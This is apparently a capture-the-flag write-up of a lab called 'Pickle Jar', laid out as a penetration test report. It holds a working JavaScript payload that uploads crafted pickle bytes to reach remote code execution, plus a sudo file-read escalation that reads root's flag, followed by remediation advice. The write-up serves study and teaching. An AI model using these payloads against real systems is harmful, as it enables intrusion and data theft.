





Report: HackerDNA "Pickle Jar"


https://hackerdna/labs/pickle-jar

**Target:** DataVault Backup Management Portal (IP: 108.131.81.181)
**Vulnerability Classes:** Insecure Deserialization (CWE-502), Arbitrary File Read, Sudo Misconfiguration (Privilege Escalation)
**Assessor:** h4xx0r
## 1. Concept of Operations (CONOPS) & Executive Summary
**CONOPS:** A black-box assumed-breach assessment targeting the DataVault web infrastructure to demonstrate the impact of insecure data handling and poor access control.
**Executive Summary:** During an authorized vulnerability assessment of the DataVault enterprise infrastructure, a critical, multi-stage exploitation chain was identified, resulting in total system compromise. The attack originated at the web application layer, where a failure to safely deserialize user-supplied backup files (.pkl) allowed for Remote Code Execution (RCE). Following initial access, systemic misconfigurations in the Linux sudo environment were abused to escalate privileges horizontally and vertically, culminating in unauthorized read access to the /root directory.
**Business Impact:** Complete loss of confidentiality, integrity, and availability. An attacker could exfiltrate sensitive enterprise data or establish persistent backdoor access.
## 2. Task Analysis & Intermediate Steps
In accordance with advanced documentation requirements, the following section details the exact methodology, intermediate payloads, and logic transformations utilized during the exploit sequence.
### Phase 1: Initial Access via Insecure Deserialization
The target application featured a "Restore Configuration Backup" function accepting .pkl files. In Python, the pickle module is notoriously unsafe for processing untrusted data, as an attacker can define a __reduce__ method to execute arbitrary system commands during object reconstruction.
To bypass egress filtering and local listener constraints (such as those inherent to Crostini environments), an **In-Band Response Hijacking** technique was utilized. The subprocess.getoutput function was invoked to capture command execution and reflect it directly into the application's JSON response body.
### Phase 2: Bypassing Data Truncation (Browser Console Injection)
Initial attempts to upload standard .pkl files resulted in EOFError and truncation errors. To ensure 100% binary accuracy and bypass web-form encoding flaws, a custom JavaScript injection payload was engineered using the browser's DevTools Console. The exploit was transmitted as a raw Uint8Array.
**Evidence - User Flag Extraction:**
```javascript
{
    // Command: cat /home/vault/flag-user.txt
    const rawBytes = [128, 4, 149, 64, 0, 0, 0, 0, 0, 0, 0, 140, 10, 115, 117, 98, 112, 114, 111, 99, 101, 115, 115, 148, 140, 9, 103, 101, 116, 111, 117, 116, 112, 117, 116, 148, 147, 148, 140, 29, 99, 97, 116, 32, 47, 104, 111, 109, 101, 47, 118, 97, 117, 108, 116, 47, 102, 108, 97, 103, 45, 117, 115, 101, 114, 46, 116, 120, 116, 148, 133, 148, 82, 148, 46];
    
    const bytes = new Uint8Array(rawBytes);
    const formData = new FormData();
    formData.append('file', new Blob([bytes], {type: "application/octet-stream"}), 'user_flag.pkl');

    fetch('/upload', { method: 'POST', body: formData })
        .then(r => r.json()).then(data => console.log(data.config));
}

```
*[+] Extracted User Flag: [REDACTED]*
### Phase 3: Privilege Escalation (Sudo Misconfiguration)
Operating as the low-privileged vault user, local reconnaissance was initiated. Execution of sudo -n -l revealed the following misconfiguration:
(root) NOPASSWD: /opt/vault/backup-util
Analysis of the /opt/vault/backup-util bash script revealed that it blindly passes user-supplied arguments to the cat command:
```bash
#!/bin/bash
if [ -z "$1" ]; then
    echo "Usage: backup-util <config-file>"
    exit 1
fi
cat "$1"

```
Because the vault user could execute this script as root, this logic flaw was weaponized into an Arbitrary File Read vulnerability. The RCE payload was modified to execute:
sudo /opt/vault/backup-util /root/flag-root.txt
This successfully bypassed all system permissions, yielding the final system objective.
*[+] Extracted Root Flag: [REDACTED]*
## 3. Rabbit Holes & Diagnostics
A distinguishing feature of a superior CTF writeup is the inclusion of "rabbit holes" and failed vectors to demonstrate diagnostic reasoning.
 * **Subprocess Exit Status 1 Crash:** Initial reconnaissance relied on subprocess.check_output to execute the find / command. Because the low-privileged user lacked read permissions for certain directories, find returned an exit status of 1. This caused the Python backend to panic and return an HTTP 400 error, obscuring the results.
 * **Diagnostic Pivot:** The methodology was successfully pivoted to use subprocess.getoutput, which suppresses strict exit-code validation and successfully returns both STDOUT and STDERR to the attacker, demonstrating advanced error-handling within blind RCE scenarios.
## 4. Remediation & Root Cause
To mitigate these vulnerabilities, the following architectural root causes must be addressed:
 1. **Deprecate Python Pickle:** The application must immediately cease using the pickle module for deserializing untrusted data. The architecture should be refactored to use safe data interchange formats such as JSON (json.loads()) or YAML (with safe loaders).
 2. **Principle of Least Privilege (Sudo):** The /opt/vault/backup-util script must not be allowed to run without a password prompt. Furthermore, the script itself requires strict input validation to ensure the argument passed is explicitly restricted to a whitelisted backup directory (e.g., using basename or strict path enforcement) rather than allowing absolute path traversal to /root/.

